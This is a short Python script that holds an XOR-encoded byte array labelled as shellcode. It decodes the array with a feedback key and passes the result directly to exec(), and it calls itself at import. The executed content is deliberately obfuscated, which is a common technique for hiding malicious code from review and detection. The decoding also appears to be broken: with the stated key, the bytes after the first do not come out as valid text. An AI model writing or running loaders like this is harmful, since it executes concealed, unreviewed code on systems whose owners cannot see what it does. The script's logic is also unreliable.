
import base64

def decode_payload():
    # Encoded shellcode (XOR encoded with feedback)
    encoded_shellcode = [225, 4, 29, 229, 29, 248, 164, 71, 28, 129, 99, 28, 165, 67, 10, 14, 255, 239, 20, 165, 16, 39, 10, 27, 225, 79, 246, 209, 233, 2, 31, 175, 105, 200, 29, 224, 8, 85, 235, 157, 91]

    # XOR decoding function
    def xor_decode(encoded_data, key):
        decoded_data = bytearray()
        feedback_key = key
        for byte in encoded_data:
            decoded_byte = byte ^ feedback_key
            decoded_data.append(decoded_byte)
            # Add feedback to modify the XOR key after each byte is decoded
            feedback_key = (feedback_key + decoded_byte) & 0xFF  # Ensure key stays within byte range (0-255)
        return decoded_data

    # Decode the shellcode
    decoded_shellcode = xor_decode(encoded_shellcode, 0xAA)  # Using same key for decoding
    exec(decoded_shellcode.decode('utf-8'))  # Execute the decoded Python shellcode

# Run the payload decoder
decode_payload()
    